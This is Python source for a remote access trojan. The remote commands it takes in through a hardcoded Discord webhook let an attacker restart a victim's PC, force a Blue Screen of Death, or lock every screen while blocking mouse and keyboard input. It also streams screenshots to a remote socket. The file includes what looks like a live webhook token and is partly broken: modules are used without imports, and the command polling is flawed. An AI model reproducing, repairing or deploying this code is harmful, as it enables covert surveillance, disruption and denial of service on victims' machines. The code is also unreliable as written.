import ctypes
import os
import subprocess
import time
import requests
from pynput.mouse import Controller as MouseController, Button
from pynput.keyboard import Controller as KeyboardController, Key as PynKey
import platform
import tkinter as tk
from PIL import Image, ImageTk
from io import BytesIO

# === Setup ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1356810627909419079/5L26qDamgl753mBQL873Mq982SK6K4_2HH-mMmrfkOASId1GXyup-vVKOXbbDw6OC2iO"  # Your Discord Webhook URL
mouse = MouseController()
keyboard = KeyboardController()

keymap = {
    "BACKSPACE": PynKey.backspace, "ENTER": PynKey.enter, "SPACE": PynKey.space,
    "TAB": PynKey.tab, "ESC": PynKey.esc, "SHIFT": PynKey.shift, "CTRL": PynKey.ctrl,
    "ALT": PynKey.alt, "CAPSLOCK": PynKey.caps_lock, "DELETE": PynKey.delete,
    "UP": PynKey.up, "DOWN": PynKey.down, "LEFT": PynKey.left, "RIGHT": PynKey.right
}

# === BSOD Trigger ===
def trigger_bsod():
    """Trigger a BSOD (Blue Screen of Death)"""
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except Exception as e:
        print(f"[!] BSOD failed: {e}")

# === Lock Screen Setup ===
lock_root = None
lock_overlays = []
lock_img_tk = None

def init_lock_root():
    """Create a Tkinter window to lock the screen."""
    global lock_root
    lock_root = tk.Tk()
    lock_root.withdraw()  # Hide the main window
    lock_root.mainloop()

# Start a thread for the lock screen functionality
threading.Thread(target=init_lock_root, daemon=True).start()

def on_any_event(e):
    """Consume any event (keystroke, mouse movement) to block user actions."""
    return "break"

def show_lock_screen_gui():
    """Show the lock screen GUI on all monitors."""
    global lock_overlays, lock_img_tk, lock_root
    if not lock_img_tk:
        try:
            res = requests.get("https://github.com/Anarxyfr/fdsa/blob/main/Anarxy.png?raw=true")
            image = Image.open(BytesIO(res.content)).resize((300, 300))
            lock_img_tk = ImageTk.PhotoImage(image)
        except:
            lock_img_tk = None

    with mss.mss() as sct:
        monitors = sct.monitors[1:]  # Skip the primary monitor

    for mon in monitors:
        win = tk.Toplevel(lock_root)
        win.overrideredirect(True)
        win.geometry(f"{mon['width']}x{mon['height']}+{mon['left']}+{mon['top']}")
        win.configure(bg="black")
        win.attributes("-topmost", True)

        # Block all mouse and keyboard events on this window
        win.bind("<Key>", on_any_event)
        win.bind("<Button>", on_any_event)
        win.bind("<Motion>", on_any_event)
        win.bind("<MouseWheel>", on_any_event)

        canvas = tk.Canvas(win, bg="black", highlightthickness=0)
        canvas.pack(fill="both", expand=True)

        canvas.create_text(mon["width"] // 2, int(mon["height"] * 0.25),
                           text="Screen locked by anarxy", fill="white", font=("Arial", 48))

        if lock_img_tk:
            canvas.create_image(mon["width"] // 2, int(mon["height"] * 0.5), image=lock_img_tk)

        lock_overlays.append(win)

    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.BlockInput(True)
        except:
            pass

def hide_lock_screen_gui():
    """Hide the lock screen and unblock user input."""
    global lock_overlays
    for w in lock_overlays:
        try: w.destroy()
        except: pass
    lock_overlays.clear()
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.BlockInput(False)
        except:
            pass

# === Command Functionality (Restart, Lock/Unlock, BSOD) ===
def execute_command(command):
    """Executes commands received from the webhook."""
    if command == "RESTART":
        subprocess.call("shutdown /r /t 0", shell=True)  # Restart the PC
    elif command == "BSOD":
        trigger_bsod()  # Trigger a BSOD (Blue Screen)
    elif command == "LOCKSCREEN":
        show_lock_screen_gui()  # Show lock screen
    elif command == "UNLOCKSCREEN":
        hide_lock_screen_gui()  # Hide lock screen

# === Webhook Command Polling ===
def check_for_commands():
    """Check the Discord Webhook for incoming commands."""
    while True:
        try:
            response = requests.get(WEBHOOK_URL)  # Fetch latest webhook message
            if response.status_code == 200:
                data = response.json()
                if 'content' in data:  # Look for the 'content' of the message
                    command = data['content'].strip()
                    if command:
                        print(f"[*] Received command: {command}")
                        execute_command(command)
        except Exception as e:
            print(f"[!] Failed to check commands: {e}")
        
        # Check every 5 seconds (can be adjusted)
        time.sleep(5)

# Start the command polling thread
threading.Thread(target=check_for_commands, daemon=True).start()

# === Main RAT Loop (Capture Screen and Send to Viewer) ===
s = socket.socket()
s.connect(('0.0.0.0', 9999))  # Placeholder for any command, can be adjusted

with mss.mss() as sct:
    monitor = sct.monitors[1]
    width = monitor["width"]
    height = monitor["height"]

    while True:
        frame = np.array(sct.grab(monitor))
        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
        _, encimg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
        data = pickle.dumps((encimg, width, height))
        s.sendall(struct.pack(">L", len(data)) + data)

        # Delay to avoid overwhelming the server (e.g., 5 seconds)
        time.sleep(5)
